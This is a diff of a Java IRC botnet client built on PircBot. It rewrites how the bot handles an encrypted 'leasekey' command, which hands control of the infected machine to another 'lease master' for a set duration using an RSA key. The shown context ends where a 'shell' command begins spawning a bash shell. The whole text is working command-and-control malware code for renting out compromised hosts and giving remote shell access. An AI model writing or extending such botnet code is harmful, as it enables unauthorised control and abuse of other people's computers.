@@ -282,21 +282,16 @@ public class BotnetClient extends PircBot {
 						chat.sendLine(leasedM.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
 						chat.close();
 					} else if (m.decryptMsg(command).startsWith("leasekey")) {
-						String[] parts = m.decryptMsg(command).split(" ");
-						if (parts.length > 4) {
-							String leaseMaster = parts[1];
-							long duration = Long.parseLong(parts[2]);
-							String mod = parts[3];
-							String exp = parts[4];
-							leaseTerminateTime = System.currentTimeMillis() + duration;
-							leased = true;
-							this.leaseMaster = leaseMaster;
-							leasedM = MsgEncrypt.getInstance();
-							leasedM.genRSAPubKey(mod + " " + exp);
-							System.out.println("leased to " + leaseMaster + " with " + leasedM.getRSAPub());
-						} else {
-							System.out.println("Failed lease message: " + command);
-						}
+						String leaseMaster = m.decryptMsg(chat.readLine());
+						long duration = Long.parseLong(m.decryptMsg(chat.readLine()));
+						String mod = m.decryptMsg(chat.readLine());;
+						String exp = m.decryptMsg(chat.readLine());;
+						leaseTerminateTime = System.currentTimeMillis() + duration;
+						leased = true;
+						this.leaseMaster = leaseMaster;
+						leasedM = MsgEncrypt.getInstance();
+						leasedM.genRSAPubKey(mod + " " + exp);
+						System.out.println("leased to " + leaseMaster + " with " + leasedM.getRSAPub());
 					} else if (m.decryptMsg(command).startsWith("shell")) {
 						//Create the bash shell
 						Runtime r = Runtime.getRuntime();
